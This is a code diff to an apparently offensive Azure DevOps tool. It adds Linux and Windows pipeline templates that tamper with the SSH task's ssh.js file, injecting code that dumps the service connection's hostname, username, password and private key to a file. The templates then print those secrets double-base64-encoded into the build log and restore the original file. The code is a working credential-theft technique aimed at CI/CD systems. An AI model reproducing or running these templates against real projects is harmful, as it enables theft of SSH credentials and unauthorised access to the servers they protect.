@@ -120,6 +120,47 @@ class DevOpsPipelineGenerator(YamlGeneratorBase):
         "trigger": "none",
     }
 
+    _serviceConnectionTemplateSSH = {
+        "trigger": "none",
+        "pool": {"vmImage": "ubuntu-latest"},
+        "steps": [
+            {"checkout": "none"},
+            {
+                "script": 'SSH_FILE=$(find /home/vsts/work/_tasks/ -name ssh.js) ; cp $SSH_FILE $SSH_FILE.bak ; sed -i \'s|const readyTimeout = getReadyTimeoutVariable();|const readyTimeout = getReadyTimeoutVariable();\\nconst fs = require("fs");var data = "";data += hostname + ":::" + port + ":::" + username + ":::" + password + ":::" + privateKey;fs.writeFile("/tmp/artefacts.tar.gz", data, (err) => {});|\' $SSH_FILE',
+                "displayName": f"Preparing {taskName}",
+            },
+            {"task": "SSH@0", "inputs": {"sshEndpoint": "#FIXME", "runOptions": "commands", "commands": "sleep 1"}},
+            {
+                "script": "SSH_FILE=$(find /home/vsts/work/_tasks/ -name ssh.js); mv $SSH_FILE.bak $SSH_FILE ; cat /tmp/artefacts.tar.gz | base64 -w0 | base64 -w0 ; echo ''",
+                "displayName": taskName,
+            },
+        ],
+    }
+
+    _serviceConnectionTemplateSSHWindows = {
+        "trigger": "none",
+        "pool": {"vmImage": "windows-latest"},
+        "steps": [
+            {"checkout": "none"},
+            {
+                "task": "PowerShell@2",
+                "inputs": {
+                    "script": 'Get-ChildItem -Path "D:\\a\\" -Recurse -Filter "ssh.js" | ForEach-Object { $p = $_.FullName; copy $p $p+".bak"; (Get-Content -Path $p -Raw) -replace [regex]::Escape(\'const readyTimeout = getReadyTimeoutVariable();\'), \'const readyTimeout = getReadyTimeoutVariable();const fs = require("fs");var data = "";data += hostname + ":::" + port + ":::" + username + ":::" + password + ":::" + privateKey;fs.writeFile("artefacts.tar.gz", data, (err) => {});\' | Set-Content -Path $p }',
+                    "targetType": "inline",
+                },
+            },
+            {"task": "SSH@0", "inputs": {"sshEndpoint": "#FIXME", "runOptions": "commands", "commands": "sleep 1"}},
+            {
+                "task": "PowerShell@2",
+                "inputs": {
+                    "script": '$encodedOnce = [Convert]::ToBase64String([IO.File]::ReadAllBytes("artefacts.tar.gz"));$encodedTwice = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($encodedOnce));echo $encodedTwice; echo \'\'; rm artefacts.tar.gz; Get-ChildItem -Path "D:\\a\\" -Recurse -Filter "ssh.js" | ForEach-Object { $p = $_.FullName; mv -force $p+".bak" $p ;}',
+                    "targetType": "inline",
+                },
+                "displayName": taskName,
+            },
+        ],
+    }
+
     def generatePipelineForSecretExtraction(self, variableGroup):
         self.addVariableGroupToYaml(variableGroup.get("name"))
         self.addSecretsToYaml(variableGroup.get("variables"))
@@ -144,6 +185,10 @@ class DevOpsPipelineGenerator(YamlGeneratorBase):
     def generatePipelineForSonar(self, sonarSCName):
         self._defaultTemplate = self._serviceConnectionTemplateSonar
         self.__setSonarServiceConnectionName(sonarSCName)
+
+    def generatePipelineForSSH(self, sshSCName):
+        self._defaultTemplate = self._serviceConnectionTemplateSSH
+        self.__setSSHServiceConnectionName(sshSCName)
 
     def addVariableGroupToYaml(self, variableGroupName):
         self._defaultTemplate.get("variables")[0]["group"] = variableGroupName
@@ -172,3 +217,6 @@ class DevOpsPipelineGenerator(YamlGeneratorBase):
 
     def __setSonarServiceConnectionName(self, scName):
         self._defaultTemplate.get("steps")[0].get("inputs")["SonarQube"] = scName
+
+    def __setSSHServiceConnectionName(self, sshName):
+        self._defaultTemplate.get("steps")[2].get("inputs")["sshEndpoint"] = sshName
